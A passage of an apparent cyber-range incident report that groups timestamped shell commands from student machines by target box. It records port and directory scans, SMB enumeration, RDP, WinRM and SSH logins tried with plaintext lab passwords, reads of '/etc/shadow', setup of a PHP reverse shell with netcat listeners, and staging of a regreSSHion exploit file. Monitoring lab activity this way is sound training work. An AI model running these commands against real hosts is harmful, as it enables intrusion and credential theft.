  - 2026-01-13T19:16:30 | logs/10.100.7.24/shell_history.csv#L46 | xfreerdp3 /u:helios /v:10.100.7.41 /p:babyblue
  - 2026-01-13T19:16:37 | logs/10.100.7.24/shell_history.csv#L47 | xfreerdp3 /u:helios /v:10.100.7.41 /p:myspace1

## Incident 100 - 2026-01-13T19:18:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-13T19:18:05 | logs/10.100.7.11/shell_history.csv#L43 | su guest
  - 2026-01-13T19:18:12 | logs/10.100.7.11/shell_history.csv#L44 | tldr su
  - 2026-01-13T19:18:32 | logs/10.100.7.11/shell_history.csv#L45 | su - guest
  - 2026-01-13T19:18:40 | logs/10.100.7.11/shell_history.csv#L46 | su solaris
  - 2026-01-13T19:18:35 | logs/10.100.7.33/shell_history.csv#L6 | tldr ftp
  - 2026-01-13T19:18:30 | logs/10.100.7.22/shell_history.csv#L63 | ls
  - 2026-01-13T19:18:51 | logs/10.100.7.22/shell_history.csv#L64 | vim credentials.txt
  - 2026-01-13T19:18:37 | logs/10.100.7.24/shell_history.csv#L48 | exit

## Incident 101 - 2026-01-13T19:18:00
- Target IP: 10.100.7.40
- Target Box: default
- Entries:
  - 2026-01-13T19:18:58 | logs/10.100.7.11/shell_history.csv#L47 | su solaris@10.100.7.40
  - 2026-01-13T19:18:07 | logs/10.100.7.34/shell_history.csv#L30 | nxc smb 10.100.7.40 -u solaris -p password123!

## Incident 102 - 2026-01-13T19:19:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-13T19:19:01 | logs/10.100.7.11/shell_history.csv#L48 | clear
  - 2026-01-13T19:19:32 | logs/10.100.7.33/shell_history.csv#L7 | tldr nxc
  - 2026-01-13T19:19:55 | logs/10.100.7.33/shell_history.csv#L8 | tldr --update

## Incident 103 - 2026-01-13T19:19:00
- Target IP: 10.100.7.40
- Target Box: default
- Entries:
  - 2026-01-13T19:19:07 | logs/10.100.7.11/shell_history.csv#L49 | nxc smb 10.100.7.40 -u guest -p ''
  - 2026-01-13T19:19:29 | logs/10.100.7.22/shell_history.csv#L65 | ssh solaris@10.100.7.40

## Incident 104 - 2026-01-13T19:19:00
- Target IP: 10.100.7.42
- Target Box: orbital
- Entries:
  - 2026-01-13T19:19:36 | logs/10.100.7.13/shell_history.csv#L49 | evil-winrm -i 10.100.7.42 -u root
  - 2026-01-13T19:19:19 | logs/10.100.7.24/shell_history.csv#L49 | nxc smb 10.100.7.42 -u orbital -p securepassword
- Matched Vulnerability Notes:
  - boxes/orbital/documentation.md: base64, sql, anonymous, SMB
  - boxes/orbital/deploy/Install-MSSQL.ps1: sql, git
  - boxes/orbital/deploy/deploy.ps1: sql, anonymous, SMB

## Incident 105 - 2026-01-13T19:21:00
- Target IP: 10.100.7.40
- Target Box: default
- Entries:
  - 2026-01-13T19:21:41 | logs/10.100.7.33/shell_history.csv#L10 | nxc smb 10.100.7.40 -u guest -p "
  - 2026-01-13T19:21:14 | logs/10.100.7.22/shell_history.csv#L66 | nmap -sV -p 1-65535 -T3 10.100.7.40

## Incident 106 - 2026-01-13T19:22:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-13T19:22:04 | logs/10.100.7.11/shell_history.csv#L52 | tldr smbclient
  - 2026-01-13T19:22:31 | logs/10.100.7.22/shell_history.csv#L68 | vim credentials.txt

## Incident 107 - 2026-01-13T19:22:00
- Target IP: 10.100.7.40
- Target Box: default
- Entries:
  - 2026-01-13T19:22:19 | logs/10.100.7.22/shell_history.csv#L67 | ssh solaris@10.100.7.40
  - 2026-01-13T19:22:33 | logs/10.100.7.22/shell_history.csv#L69 | ssh solaris@10.100.7.40
  - 2026-01-13T19:22:52 | logs/10.100.7.22/shell_history.csv#L70 | ssh solaris@10.100.7.40

## Incident 108 - 2026-01-13T19:24:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-13T19:24:11 | logs/10.100.7.11/shell_history.csv#L53 | smbclient //server/share
  - 2026-01-13T19:24:33 | logs/10.100.7.11/shell_history.csv#L54 | smbclient //server/share --user guest
  - 2026-01-13T19:24:23 | logs/10.100.7.32/shell_history.csv#L241 | exit
  - 2026-01-13T19:24:25 | logs/10.100.7.32/shell_history.csv#L242 | clear

## Incident 109 - 2026-01-13T19:27:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-13T19:27:16 | logs/10.100.7.11/shell_history.csv#L55 | smbclient //server/share --user guest%''
  - 2026-01-13T19:27:23 | logs/10.100.7.11/shell_history.csv#L56 | smbclient //server/share --user guest%

## Incident 110 - 2026-01-13T19:27:00
- Target IP: 10.100.7.40
- Target Box: default
- Entries:
  - 2026-01-13T19:27:33 | logs/10.100.7.32/shell_history.csv#L246 | ssh solaris@10.100.7.40
  - 2026-01-13T19:27:34 | logs/10.100.7.32/shell_history.csv#L247 | ssh solaris@10.100.7.40
  - 2026-01-13T19:27:51 | logs/10.100.7.32/shell_history.csv#L248 | ssh root@10.100.7.40

## Incident 111 - 2026-01-13T19:27:00
- Target IP: 10.100.7.42
- Target Box: orbital
- Entries:
  - 2026-01-13T19:27:04 | logs/10.100.7.24/shell_history.csv#L50 | xfreerdp3 /u:orbital /v:10.100.7.42 /p:securepassword
  - 2026-01-13T19:27:41 | logs/10.100.7.24/shell_history.csv#L51 | xfreerdp3 /u:Administrator /v:10.100.7.42 /p:forthescience
  - 2026-01-13T19:27:48 | logs/10.100.7.24/shell_history.csv#L52 | xfreerdp3 /u:Administrator /v:10.100.7.42 /p:4theScience!
- Matched Vulnerability Notes:
  - boxes/orbital/documentation.md: base64, sql, anonymous, SMB
  - boxes/orbital/deploy/Install-MSSQL.ps1: sql, git
  - boxes/orbital/deploy/deploy.ps1: sql, anonymous, SMB

## Incident 112 - 2026-01-13T19:29:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-13T19:29:26 | logs/10.100.7.11/shell_history.csv#L57 | smbclient //solaris/public
  - 2026-01-13T19:29:50 | logs/10.100.7.11/shell_history.csv#L58 | smbclient //solaris/public --user guest
  - 2026-01-13T19:29:51 | logs/10.100.7.11/shell_history.csv#L59 | ls
  - 2026-01-13T19:29:57 | logs/10.100.7.11/shell_history.csv#L60 | unzip backup.zip
  - 2026-01-13T19:29:59 | logs/10.100.7.11/shell_history.csv#L61 | ls

## Incident 113 - 2026-01-13T19:29:00
- Target IP: 10.100.7.40
- Target Box: default
- Entries:
  - 2026-01-13T19:29:00 | logs/10.100.7.33/shell_history.csv#L16 | nxc smb 10.100.7.40 -u guest -p credentials.txt
  - 2026-01-13T19:29:49 | logs/10.100.7.32/shell_history.csv#L250 | ssh -i ~/.ssh/helios_ssh_key solaris@10.100.7.40
  - 2026-01-13T19:29:50 | logs/10.100.7.32/shell_history.csv#L251 | ssh -i ~/.ssh/helios_ssh_key solaris@10.100.7.40
  - 2026-01-13T19:29:55 | logs/10.100.7.32/shell_history.csv#L252 | ssh -i ~/.ssh/helios_ssh_key solaris@10.100.7.40
  - 2026-01-13T19:29:10 | logs/10.100.7.13/shell_history.csv#L51 | nmap -sV -p 1-65535 -T3 10.100.7.40

## Incident 114 - 2026-01-13T19:30:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-13T19:30:04 | logs/10.100.7.11/shell_history.csv#L62 | cat credentials.txt
  - 2026-01-13T19:30:36 | logs/10.100.7.33/shell_history.csv#L17 | nano credentials.txt

## Incident 115 - 2026-01-13T19:30:00
- Target IP: 10.100.7.40
- Target Box: default
- Entries:
  - 2026-01-13T19:30:47 | logs/10.100.7.32/shell_history.csv#L253 | nxc smb 10.100.7.40 -u guest -p ''
  - 2026-01-13T19:30:52 | logs/10.100.7.32/shell_history.csv#L254 | nxc smb 10.100.7.40 -u guest -p '' --shares
  - 2026-01-13T19:30:57 | logs/10.100.7.32/shell_history.csv#L255 | nxc smb 10.100.7.40 -u guest -p '' --shares

## Incident 116 - 2026-01-13T19:35:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-13T19:35:28 | logs/10.100.7.33/shell_history.csv#L20 | nxc smb 10.100.mbclient //server/share --user shares
  - 2026-01-13T19:35:46 | logs/10.100.7.33/shell_history.csv#L21 | nxc smb 10.100.mbclient //server/share --user solaris

## Incident 117 - 2026-01-13T19:36:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-13T19:36:56 | logs/10.100.7.34/shell_history.csv#L31 | smbclient //server/share --user guest
  - 2026-01-13T19:36:26 | logs/10.100.7.13/shell_history.csv#L56 | tldr nxc

## Incident 118 - 2026-01-13T19:37:00
- Target IP: 10.100.7.40
- Target Box: default
- Entries:
  - 2026-01-13T19:37:00 | logs/10.100.7.11/shell_history.csv#L65 | nmap -sV -p 1-65535 -T3 10.100.7.40
  - 2026-01-13T19:37:12 | logs/10.100.7.33/shell_history.csv#L22 | smbclient.py guest@10.100.7.40
  - 2026-01-13T19:37:33 | logs/10.100.7.33/shell_history.csv#L23 | smbclient guest@10.100.7.40

## Incident 119 - 2026-01-13T19:37:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-13T19:37:07 | logs/10.100.7.32/shell_history.csv#L263 | ls
  - 2026-01-13T19:37:08 | logs/10.100.7.32/shell_history.csv#L264 | ls
  - 2026-01-13T19:37:14 | logs/10.100.7.32/shell_history.csv#L265 | ls
  - 2026-01-13T19:37:16 | logs/10.100.7.32/shell_history.csv#L266 | cd Documents
  - 2026-01-13T19:37:17 | logs/10.100.7.32/shell_history.csv#L267 | ls
  - 2026-01-13T19:37:31 | logs/10.100.7.32/shell_history.csv#L270 | cd forge-logs
  - 2026-01-13T19:37:31 | logs/10.100.7.32/shell_history.csv#L271 | ls
  - 2026-01-13T19:37:32 | logs/10.100.7.32/shell_history.csv#L272 | cd logs
  - 2026-01-13T19:37:32 | logs/10.100.7.32/shell_history.csv#L273 | ls
  - 2026-01-13T19:37:35 | logs/10.100.7.32/shell_history.csv#L274 | cat maintenance.log
  - 2026-01-13T19:37:38 | logs/10.100.7.32/shell_history.csv#L275 | cat production.log
  - 2026-01-13T19:37:43 | logs/10.100.7.32/shell_history.csv#L276 | cat quality.log

## Incident 120 - 2026-01-13T19:37:00
- Target IP: 10.100.7.44
- Target Box: forge
- Entries:
  - 2026-01-13T19:37:19 | logs/10.100.7.32/shell_history.csv#L268 | git clone 10.100.7.44
  - 2026-01-13T19:37:29 | logs/10.100.7.32/shell_history.csv#L269 | git clone http://10.100.7.44/git/forge-logs.git/
- Matched Vulnerability Notes:
  - boxes/forge/documentation.md: git, cron
  - boxes/forge/deploy/init-repo.sh: git
  - boxes/forge/deploy/root-cron.sh: git, cron
  - boxes/forge/deploy/deploy.sh: git, cron
  - boxes/forge/deploy/nginx-git.conf: git

## Incident 121 - 2026-01-13T19:39:00
- Target IP: 10.100.7.40
- Target Box: default
- Entries:
  - 2026-01-13T19:39:11 | logs/10.100.7.11/shell_history.csv#L66 | ssh solaris@10.100.7.40
  - 2026-01-13T19:39:56 | logs/10.100.7.33/shell_history.csv#L25 | smbclient -L //10.100.7.40 -U solaris

## Incident 122 - 2026-01-13T19:39:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-13T19:39:30 | logs/10.100.7.34/shell_history.csv#L32 | smbclient //server/share --user guest
  - 2026-01-13T19:39:00 | logs/10.100.7.32/shell_history.csv#L285 | git switch -
  - 2026-01-13T19:39:04 | logs/10.100.7.32/shell_history.csv#L286 | git switch -
  - 2026-01-13T19:39:05 | logs/10.100.7.32/shell_history.csv#L287 | git switch 7eb86abd35407250c6468b51c0537dc528f2dc1d
  - 2026-01-13T19:39:53 | logs/10.100.7.13/shell_history.csv#L57 | tldr nxc

## Incident 123 - 2026-01-13T19:42:00
- Target IP: 10.100.7.40
- Target Box: default
- Entries:
  - 2026-01-13T19:42:31 | logs/10.100.7.11/shell_history.csv#L67 | nxc smb 10.100.7.40 -u guest -p '' --shares
  - 2026-01-13T19:42:06 | logs/10.100.7.34/shell_history.csv#L35 | nxc smb 10.100.7.40 -u asdfasdfsolaris -p passwasdfasdford123! --users
  - 2026-01-13T19:42:46 | logs/10.100.7.13/shell_history.csv#L63 | nxc smb 10.100.7.40 -u guest -p ''
  - 2026-01-13T19:42:01 | logs/10.100.7.24/shell_history.csv#L59 | ssh solaris@10.100.7.40

## Incident 124 - 2026-01-13T19:44:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-13T19:44:53 | logs/10.100.7.33/shell_history.csv#L29 | smbclient --list= --no-pass
  - 2026-01-13T19:44:53 | logs/10.100.7.33/shell_history.csv#L30 | smbclient --list= --no-pass

## Incident 125 - 2026-01-13T19:44:00
- Target IP: 10.100.7.42
- Target Box: orbital
- Entries:
  - 2026-01-13T19:44:32 | logs/10.100.7.24/shell_history.csv#L60 | nxc smb 10.100.7.42 -u orbital -p securepassword
  - 2026-01-13T19:44:42 | logs/10.100.7.24/shell_history.csv#L61 | nxc smb 10.100.7.42 -u orbital -p securepassword --users
- Matched Vulnerability Notes:
  - boxes/orbital/documentation.md: base64, sql, anonymous, SMB
  - boxes/orbital/deploy/Install-MSSQL.ps1: sql, git
  - boxes/orbital/deploy/deploy.ps1: sql, anonymous, SMB

## Incident 126 - 2026-01-13T19:46:00
- Target IP: 10.100.7.42
- Target Box: orbital
- Entries:
  - 2026-01-13T19:46:14 | logs/10.100.7.11/shell_history.csv#L69 | nmap -sV -p 1-65535 -T3 10.100.7.42
  - 2026-01-13T19:46:32 | logs/10.100.7.11/shell_history.csv#L70 | nmap -sV -p 3389 -T3 10.100.7.42
  - 2026-01-13T19:46:48 | logs/10.100.7.11/shell_history.csv#L71 | nmap -sV -p 5985 -T3 10.100.7.42
- Matched Vulnerability Notes:
  - boxes/orbital/documentation.md: base64, sql, anonymous, SMB
  - boxes/orbital/deploy/Install-MSSQL.ps1: sql, git
  - boxes/orbital/deploy/deploy.ps1: sql, anonymous, SMB

## Incident 127 - 2026-01-13T19:46:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-13T19:46:02 | logs/10.100.7.33/shell_history.csv#L35 | smbclient //server/share -U username --option='client min protocol=SMB2'
  - 2026-01-13T19:46:32 | logs/10.100.7.33/shell_history.csv#L36 | smbclient -L //server -U solaris
  - 2026-01-13T19:46:42 | logs/10.100.7.33/shell_history.csv#L37 | clear
  - 2026-01-13T19:46:51 | logs/10.100.7.33/shell_history.csv#L38 | tldr smbclient
  - 2026-01-13T19:46:54 | logs/10.100.7.32/shell_history.csv#L292 | git log
  - 2026-01-13T19:46:54 | logs/10.100.7.32/shell_history.csv#L293 | ls
  - 2026-01-13T19:46:55 | logs/10.100.7.32/shell_history.csv#L294 | cd ..
  - 2026-01-13T19:46:55 | logs/10.100.7.32/shell_history.csv#L295 | s
  - 2026-01-13T19:46:57 | logs/10.100.7.32/shell_history.csv#L296 | cd ..
  - 2026-01-13T19:46:57 | logs/10.100.7.32/shell_history.csv#L297 | ls
  - 2026-01-13T19:46:59 | logs/10.100.7.32/shell_history.csv#L298 | ls

## Incident 128 - 2026-01-13T19:47:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-13T19:47:24 | logs/10.100.7.11/shell_history.csv#L72 | tldr evil-winrm
  - 2026-01-13T19:47:17 | logs/10.100.7.33/shell_history.csv#L39 | smbclient //server/share
  - 2026-01-13T19:47:00 | logs/10.100.7.32/shell_history.csv#L299 | cd ..
  - 2026-01-13T19:47:00 | logs/10.100.7.32/shell_history.csv#L300 | ls
  - 2026-01-13T19:47:02 | logs/10.100.7.32/shell_history.csv#L301 | ls
  - 2026-01-13T19:47:04 | logs/10.100.7.32/shell_history.csv#L302 | cd Videos
  - 2026-01-13T19:47:05 | logs/10.100.7.32/shell_history.csv#L303 | ls
  - 2026-01-13T19:47:06 | logs/10.100.7.32/shell_history.csv#L304 | cd ../Documents
  - 2026-01-13T19:47:06 | logs/10.100.7.32/shell_history.csv#L305 | ls
  - 2026-01-13T19:47:08 | logs/10.100.7.32/shell_history.csv#L306 | ls
  - 2026-01-13T19:47:10 | logs/10.100.7.32/shell_history.csv#L307 | vi helios_credentials.txt

## Incident 129 - 2026-01-13T19:54:00
- Target IP: 10.100.7.42
- Target Box: orbital
- Entries:
  - 2026-01-13T19:54:11 | logs/10.100.7.11/shell_history.csv#L73 | evil-winrm -i 10.100.7.42 -u orbital
  - 2026-01-13T19:54:55 | logs/10.100.7.11/shell_history.csv#L74 | evil-winrm -i 10.100.7.42 -u orbital
  - 2026-01-13T19:54:38 | logs/10.100.7.32/shell_history.csv#L321 | smbclient //10.100.7.42/public --user guest
  - 2026-01-13T19:54:53 | logs/10.100.7.32/shell_history.csv#L322 | smbclient //10.100.7.42/public --user guest
- Matched Vulnerability Notes:
  - boxes/orbital/documentation.md: base64, sql, anonymous, SMB
  - boxes/orbital/deploy/Install-MSSQL.ps1: sql, git
  - boxes/orbital/deploy/deploy.ps1: sql, anonymous, SMB

## Incident 130 - 2026-01-13T19:55:00
- Target IP: 10.100.7.40
- Target Box: default
- Entries:
  - 2026-01-13T19:55:01 | logs/10.100.7.32/shell_history.csv#L323 | nxc smb 10.100.7.40 -u guest -p '' --shares
  - 2026-01-13T19:55:11 | logs/10.100.7.32/shell_history.csv#L324 | ssh solaris@10.100.7.40
  - 2026-01-13T19:55:38 | logs/10.100.7.32/shell_history.csv#L325 | ssh -i ~/.ssh/helios_ssh_key solaris@10.100.7.40

## Incident 131 - 2026-01-13T19:56:00
- Target IP: 10.100.7.42
- Target Box: orbital
- Entries:
  - 2026-01-13T19:56:00 | logs/10.100.7.11/shell_history.csv#L77 | evil-winrm -i 10.100.7.42 -u orbital
  - 2026-01-13T19:56:49 | logs/10.100.7.32/shell_history.csv#L326 | nxc smb 10.100.7.42 -u guest -p '' --shares
- Matched Vulnerability Notes:
  - boxes/orbital/documentation.md: base64, sql, anonymous, SMB
  - boxes/orbital/deploy/Install-MSSQL.ps1: sql, git
  - boxes/orbital/deploy/deploy.ps1: sql, anonymous, SMB

## Incident 132 - 2026-01-13T19:58:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-13T19:58:01 | logs/10.100.7.11/shell_history.csv#L78 | tldr evil-winrm
  - 2026-01-13T19:58:58 | logs/10.100.7.14/shell_history.csv#L52 | cat /etc/shadow

## Incident 133 - 2026-01-13T19:58:00
- Target IP: 10.100.7.40
- Target Box: default
- Entries:
  - 2026-01-13T19:58:18 | logs/10.100.7.33/shell_history.csv#L42 | smbclient //10.100.7.40/public --user solaris
  - 2026-01-13T19:58:09 | logs/10.100.7.32/shell_history.csv#L329 | nxc smb 10.100.7.40 -u solaris -p solar-paneL321
  - 2026-01-13T19:58:50 | logs/10.100.7.24/shell_history.csv#L66 | ssh solaris@10.100.7.40

## Incident 134 - 2026-01-13T19:58:00
- Target IP: 10.100.7.42
- Target Box: orbital
- Entries:
  - 2026-01-13T19:58:28 | logs/10.100.7.32/shell_history.csv#L330 | nxc smb 10.100.7.42 -u guest -p ''
  - 2026-01-13T19:58:59 | logs/10.100.7.32/shell_history.csv#L331 | nxc smb 10.100.7.42 -u solaris -p solar-paneL321
  - 2026-01-13T19:58:53 | logs/10.100.7.24/shell_history.csv#L67 | xfreerdp3 /u:orbital /v:10.100.7.42 /p:securepassword
  - 2026-01-13T19:58:57 | logs/10.100.7.24/shell_history.csv#L68 | xfreerdp3 /u:orbital /v:10.100.7.42 /p:securepassword
- Matched Vulnerability Notes:
  - boxes/orbital/documentation.md: base64, sql, anonymous, SMB
  - boxes/orbital/deploy/Install-MSSQL.ps1: sql, git
  - boxes/orbital/deploy/deploy.ps1: sql, anonymous, SMB

## Incident 135 - 2026-01-13T19:59:00
- Target IP: 10.100.7.42
- Target Box: orbital
- Entries:
  - 2026-01-13T19:59:40 | logs/10.100.7.11/shell_history.csv#L79 | evil-winrm -i 10.100.7.42 -u root
  - 2026-01-13T19:59:53 | logs/10.100.7.32/shell_history.csv#L332 | nxc smb 10.100.7.42 -u solaris -p solar-paneL321
  - 2026-01-13T19:59:00 | logs/10.100.7.24/shell_history.csv#L69 | xfreerdp3 /u:orbital /v:10.100.7.42 /p:securepassword
  - 2026-01-13T19:59:10 | logs/10.100.7.24/shell_history.csv#L70 | xfreerdp3 /u:orbital /v:10.100.7.42 /p:securepassword
- Matched Vulnerability Notes:
  - boxes/orbital/documentation.md: base64, sql, anonymous, SMB
  - boxes/orbital/deploy/Install-MSSQL.ps1: sql, git
  - boxes/orbital/deploy/deploy.ps1: sql, anonymous, SMB

## Incident 136 - 2026-01-13T19:59:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-13T19:59:46 | logs/10.100.7.33/shell_history.csv#L43 | unzip backup.zip
  - 2026-01-13T19:59:11 | logs/10.100.7.14/shell_history.csv#L53 | sudo cat /etc/shadow

## Incident 137 - 2026-01-13T20:00:00
- Target IP: 10.100.7.40
- Target Box: default
- Entries:
  - 2026-01-13T20:00:48 | logs/10.100.7.34/shell_history.csv#L48 | ssh solaris@10.100.7.40
  - 2026-01-13T20:00:02 | logs/10.100.7.32/shell_history.csv#L333 | smbclient //10.100.7.40/public -u guest
  - 2026-01-13T20:00:16 | logs/10.100.7.32/shell_history.csv#L334 | smbclient //10.100.7.40/public --user guest
  - 2026-01-13T20:00:56 | logs/10.100.7.32/shell_history.csv#L335 | smbclient //10.100.7.40/public --user guest
  - 2026-01-13T20:00:57 | logs/10.100.7.32/shell_history.csv#L336 | smbclient //10.100.7.40/public -u guest
  - 2026-01-13T20:00:03 | logs/10.100.7.24/shell_history.csv#L71 | ssh solaris@10.100.7.40

## Incident 138 - 2026-01-13T20:01:00
- Target IP: 10.100.7.42
- Target Box: orbital
- Entries:
  - 2026-01-13T20:01:40 | logs/10.100.7.11/shell_history.csv#L81 | evil-winrm -i 10.100.7.42
  - 2026-01-13T20:01:57 | logs/10.100.7.32/shell_history.csv#L342 | nxc smb 10.100.7.42 -u guest -X echo""
- Matched Vulnerability Notes:
  - boxes/orbital/documentation.md: base64, sql, anonymous, SMB
  - boxes/orbital/deploy/Install-MSSQL.ps1: sql, git
  - boxes/orbital/deploy/deploy.ps1: sql, anonymous, SMB

## Incident 139 - 2026-01-13T20:01:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-13T20:01:07 | logs/10.100.7.32/shell_history.csv#L338 | ls
  - 2026-01-13T20:01:09 | logs/10.100.7.32/shell_history.csv#L339 | unzip backup.zip
  - 2026-01-13T20:01:10 | logs/10.100.7.32/shell_history.csv#L340 | ls
  - 2026-01-13T20:01:12 | logs/10.100.7.32/shell_history.csv#L341 | cat credentials.txt

## Incident 140 - 2026-01-13T20:05:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-13T20:05:20 | logs/10.100.7.11/shell_history.csv#L82 | tldr smbclient
  - 2026-01-13T20:05:20 | logs/10.100.7.24/shell_history.csv#L77 | ~

## Incident 141 - 2026-01-13T20:05:00
- Target IP: 10.100.7.42
- Target Box: orbital
- Entries:
  - 2026-01-13T20:05:19 | logs/10.100.7.24/shell_history.csv#L76 | ^[[200~xfreerdp3 /u:orbital /v:10.100.7.42 /p:securepassword
  - 2026-01-13T20:05:24 | logs/10.100.7.24/shell_history.csv#L78 | xfreerdp3 /u:orbital /v:10.100.7.42 /p:securepassword
  - 2026-01-13T20:05:26 | logs/10.100.7.24/shell_history.csv#L79 | xfreerdp3 /u:orbital /v:10.100.7.42 /p:securepassword
- Matched Vulnerability Notes:
  - boxes/orbital/documentation.md: base64, sql, anonymous, SMB
  - boxes/orbital/deploy/Install-MSSQL.ps1: sql, git
  - boxes/orbital/deploy/deploy.ps1: sql, anonymous, SMB

## Incident 142 - 2026-01-13T20:06:00
- Target IP: 10.100.7.41
- Target Box: helios
- Entries:
  - 2026-01-13T20:06:08 | logs/10.100.7.11/shell_history.csv#L84 | nxc smb 10.100.7.41 -u guest -p '' --shares
  - 2026-01-13T20:06:26 | logs/10.100.7.11/shell_history.csv#L85 | nxc smb 10.100.7.41 -u orbital -p '' --shares
  - 2026-01-13T20:06:36 | logs/10.100.7.11/shell_history.csv#L86 | nxc smb 10.100.7.41 -u orbital

## Incident 143 - 2026-01-13T20:11:00
- Target IP: 10.100.7.40
- Target Box: default
- Entries:
  - 2026-01-13T20:11:01 | logs/10.100.7.11/shell_history.csv#L87 | nmap -sV -p 80 10.100.7.40
  - 2026-01-13T20:11:18 | logs/10.100.7.34/shell_history.csv#L55 | gobuster dir -u http://10.100.7.40 -w /usr/share/wordlists/dirb/common.txt

## Incident 144 - 2026-01-13T20:11:00
- Target IP: 10.100.7.42
- Target Box: orbital
- Entries:
  - 2026-01-13T20:11:34 | logs/10.100.7.32/shell_history.csv#L350 | nxc smb 10.100.7.42 -u administrator -p helios_credentials.txt
  - 2026-01-13T20:11:42 | logs/10.100.7.32/shell_history.csv#L351 | nxc smb 10.100.7.42 -u Administrator -p helios_credentials.txt
- Matched Vulnerability Notes:
  - boxes/orbital/documentation.md: base64, sql, anonymous, SMB
  - boxes/orbital/deploy/Install-MSSQL.ps1: sql, git
  - boxes/orbital/deploy/deploy.ps1: sql, anonymous, SMB

## Incident 145 - 2026-01-13T20:11:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-13T20:11:05 | logs/10.100.7.13/shell_history.csv#L70 | tldr gunzip
  - 2026-01-13T20:11:15 | logs/10.100.7.13/shell_history.csv#L71 | gzip --decompress
  - 2026-01-13T20:11:27 | logs/10.100.7.13/shell_history.csv#L72 | gzip --decompress backup.zip
  - 2026-01-13T20:11:40 | logs/10.100.7.13/shell_history.csv#L73 | unzip backup.zip
  - 2026-01-13T20:11:48 | logs/10.100.7.13/shell_history.csv#L74 | ls

## Incident 146 - 2026-01-13T20:13:00
- Target IP: 10.100.7.40
- Target Box: default
- Entries:
  - 2026-01-13T20:13:49 | logs/10.100.7.11/shell_history.csv#L88 | gobuster dir -u 10.100.7.40 -w /usr/share/wordlists/dirb/big.txt
  - 2026-01-13T20:13:03 | logs/10.100.7.13/shell_history.csv#L76 | ssh solaris@10.100.7.40

## Incident 147 - 2026-01-13T20:21:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-13T20:21:06 | logs/10.100.7.11/shell_history.csv#L89 | exit
  - 2026-01-13T20:21:25 | logs/10.100.7.11/shell_history.csv#L90 | ls
  - 2026-01-13T20:21:30 | logs/10.100.7.11/shell_history.csv#L91 | cd ~
  - 2026-01-13T20:21:55 | logs/10.100.7.13/shell_history.csv#L86 | smbclient //orbital/public --user guest

## Incident 148 - 2026-01-13T20:22:00
- Target IP: 10.100.7.40
- Target Box: default
- Entries:
  - 2026-01-13T20:22:28 | logs/10.100.7.11/shell_history.csv#L92 | gobuster dir -u 10.100.7.40 -w /usr/sharedirbuster/wordlists
  - 2026-01-13T20:22:12 | logs/10.100.7.22/shell_history.csv#L76 | nmap -sV -p 1-65535 -T3 10.100.7.40-43

## Incident 149 - 2026-01-13T20:23:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-13T20:23:07 | logs/10.100.7.11/shell_history.csv#L93 | cd /usr/share/wordlists/dirb
  - 2026-01-13T20:23:09 | logs/10.100.7.11/shell_history.csv#L94 | ls
  - 2026-01-13T20:23:14 | logs/10.100.7.13/shell_history.csv#L88 | smbclient //orbital/public --user guest
  - 2026-01-13T20:23:15 | logs/10.100.7.13/shell_history.csv#L89 | ls
  - 2026-01-13T20:23:21 | logs/10.100.7.13/shell_history.csv#L90 | cat maintenance.log

## Incident 150 - 2026-01-13T20:26:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-13T20:26:15 | logs/10.100.7.11/shell_history.csv#L97 | exit
  - 2026-01-13T20:26:21 | logs/10.100.7.11/shell_history.csv#L99 | touch test.txt

## Incident 151 - 2026-01-20T19:33:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-20T19:33:19 | logs/10.100.7.14/shell_history.csv#L152 | cat file1.txt.pub
  - 2026-01-20T19:33:19 | logs/10.100.7.14/shell_history.csv#L153 | cat file1.txt.pub
  - 2026-01-20T19:33:19 | logs/10.100.7.14/shell_history.csv#L154 | cat file1.txt.pub
  - 2026-01-20T19:33:20 | logs/10.100.7.14/shell_history.csv#L155 | cat file1.txt.pub
  - 2026-01-20T19:33:00 | logs/10.100.7.22/shell_history.csv#L119 | vim regresshion.txt

## Incident 152 - 2026-01-20T19:35:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-20T19:35:26 | logs/10.100.7.11/shell_history.csv#L101 | nano php-rev-shell
  - 2026-01-20T19:35:53 | logs/10.100.7.11/shell_history.csv#L102 | mv php-rev-shell php-rev-shell.php
  - 2026-01-20T19:35:24 | logs/10.100.7.22/shell_history.csv#L123 | ls

## Incident 153 - 2026-01-20T19:38:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-20T19:38:01 | logs/10.100.7.11/shell_history.csv#L103 | sudo apt install penelope
  - 2026-01-20T19:38:28 | logs/10.100.7.11/shell_history.csv#L104 | pipx install penelope
  - 2026-01-20T19:38:52 | logs/10.100.7.11/shell_history.csv#L105 | nc -lvnp 4444
  - 2026-01-20T19:38:57 | logs/10.100.7.11/shell_history.csv#L106 | penelope
  - 2026-01-20T19:38:19 | logs/10.100.7.32/shell_history.csv#L437 | nc -lvnp 5555
  - 2026-01-20T19:38:21 | logs/10.100.7.32/shell_history.csv#L438 | who -u
  - 2026-01-20T19:38:39 | logs/10.100.7.22/shell_history.csv#L130 | mv 7etsuo-regreSSHHion.c cve6387
  - 2026-01-20T19:38:49 | logs/10.100.7.22/shell_history.csv#L131 | mv 7etsuo-regreSSHHion.c cve6387
  - 2026-01-20T19:38:55 | logs/10.100.7.22/shell_history.csv#L132 | mv Makefile cve6387

## Incident 154 - 2026-01-20T19:39:00
- Target IP: None
- Target Box: None
- Entries:
